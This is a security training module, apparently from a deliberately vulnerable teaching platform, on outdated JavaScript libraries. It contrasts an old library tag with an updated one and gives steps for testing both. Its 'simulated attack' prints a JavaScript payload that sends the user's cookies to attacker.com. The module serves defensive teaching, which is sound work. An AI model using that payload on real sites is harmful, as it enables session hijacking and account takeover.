# **Module 6: Vulnerable and Outdated Componentss**

## **Introduction**
**Vulnerable and outdated components** refer to **old libraries, dependencies, or software versions** that contain **known security vulnerabilities**. Attackers exploit these weaknesses to **execute remote code, steal data, or compromise the system**.

In this module, we demonstrate how **an outdated JavaScript library** with known vulnerabilities can be exploited and how keeping software updated prevents such attacks.

---

## **Vulnerability: Using Outdated Libraries**
**Issue:** The platform is using an **outdated JavaScript library (v1.2.3)**, which contains known security vulnerabilities that can:
- **Expose user data** through XSS attacks.
- **Allow remote code execution**.
- **Bypass authentication mechanisms**.

---

## **Insecure Code Example**
This code loads an **outdated version of a JavaScript library** with known security flaws.

```html
<!-- Insecure Code: Using an outdated library -->
<script src="https://cdn.oldlibrary.com/v1.2.3/library.js"></script>
```

---

## **Simulated Attack**
How an attacker can exploit this flaw

1. The attacker scans the application and identifies that the platform is using Library v1.2.3, which is outdated.
2. They find a public exploit that allows them to run malicious JavaScript code remotely.
3. The attacker injects a payload that steals session tokens:

```javascript
// Exploiting outdated JavaScript library
document.location='https://attacker.com/steal?cookie=' + document.cookie;
```

**Consequence:** The attacker gains access to user sessions, allowing account takeover.

---

## **Proper Implementation: Keep Software Updated**
The system should always use the latest, secure versions of all libraries.

```html
<!-- Secure Code: Using an updated library -->
<script src="https://cdn.securelibrary.com/v2.5.0/library.js"></script>
```
### **Why is this secure?**
- Fixes known vulnerabilities in outdated versions.
- Protects against public exploits that target older versions.
- Reduces the risk of code execution attacks.

---

## **How to Test the Vulnerability in the Platform**

### **Step 1: Simulate an Attack Using an Outdated Librar**
1. Log into the user dashboard.
2. Click "Check for Library Updates".
3. If the system reports "Version v1.2.3 (Vulnerable)", attempt to inject malicious JavaScript.
4. Observe that the attack succeeds because the library is outdated.

### **Step 2: Test the Secure Implementation**
1. Click "Update to Secure Version" to apply Library v2.5.0.
2. Attempt the same attack again.
3. The system now prevents exploitation, and the script is blocked.

---

## **Conclusion**

- NEVER use outdated libraries or software components.
- Regularly check for software updates and apply security patches.
- Monitor dependencies for known vulnerabilities.
- Use a package manager (npm, yarn) to track updates automatically.
